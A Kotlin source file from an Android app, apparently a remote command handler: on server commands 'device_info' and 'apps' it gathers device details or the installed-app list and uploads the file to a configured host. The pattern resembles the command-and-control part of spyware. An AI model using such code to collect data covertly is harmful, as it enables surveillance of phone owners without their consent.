package com.kashem.shaikh

import android.content.Context
import android.util.Log

object CommandProcessor {

    fun processCommand(command: String, context: Context) {
        when {
            command.startsWith("device_info") -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    Log.e("CommandProcessor", "Config missing, cannot upload device info")
                    return
                }
                val (host, _) = urls
                val file = DeviceInfo.collectInfo(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) {
                        Log.d("CommandProcessor", "Device info uploaded")
                    } else {
                        Log.e("CommandProcessor", "Upload failed")
                    }
                }
            }
            command == "apps" -> {
                val urls = ConfigManager.getServerUrls(context)
                if (urls == null) {
                    Log.e("CommandProcessor", "Config missing, cannot upload app list")
                    return
                }
                val (host, _) = urls
                val file = AppList.collectApps(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) {
                        Log.d("CommandProcessor", "App list uploaded")
                    } else {
                        Log.e("CommandProcessor", "Upload failed")
                    }
                }
            }
            // ভবিষ্যতে অন্যান্য কমান্ড এখানে যুক্ত করা যাবে
            else -> Log.d("CommandProcessor", "Unknown command: $command")
        }
    }
}